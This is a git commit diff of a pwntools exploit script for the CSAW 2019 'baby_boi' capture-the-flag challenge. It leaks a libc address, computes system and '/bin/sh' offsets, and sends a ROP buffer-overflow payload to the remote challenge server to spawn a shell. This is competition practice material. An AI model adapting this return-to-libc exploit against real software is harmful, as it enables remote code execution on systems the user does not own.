d474a11afc7f957b9a0a028abac977d0eb110e9c
Clif Wolfe <clifwolfe1@gmail.com>
2019-09-20 12:10:42 -0400

    updated

--- csaw2019/baby_boi.py
+++ csaw2019/baby_boi.py
@@ -4,14 +4,19 @@ import re
 
 binary = ELF("baby_boi")
 rop = ROP(binary)
-# p = pwn.tubes.remote.remote("pwn.chal.csaw.io", 1005)
-printf_offset = 0x00055750
-system_offset_from_printf = - 57088
-binsh_offset = 0x186cee
+# printf_offset = 0x00055750
+# system_offset = 0x00047850
+# binsh_offset = 0x186cee
+printf_offset = 0x00064e80
+system_offset = 0x0004f440
+binsh_offset = 0x1b3e9a
+system_offset_from_printf = system_offset - printf_offset
 
-p = process(["./baby_boi"], shell=True)
-print(f"PID: {p.proc.pid}")
+# p = process(["./baby_boi"], shell=True)
+# print(f"PID: {p.proc.pid}")
 
+p = remote("pwn.chal.csaw.io", 1005)
+pause()
 prompt = p.read()
 match = re.search(b'(0x[a-zA-Z0-9]+)', prompt)
 leaked_addr = int(match.groups()[0].decode(), 16)
@@ -23,7 +28,7 @@ pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
 payload = ("D"*32).encode() + ("B"*8).encode()
 payload += p64(pop_rdi_ret)
 payload += p64(binsh_addr)
-payload += p64(system_addr)
+payload += p64(leaked_addr)
 p.sendline(payload)
 p.interactive()
 p.close()
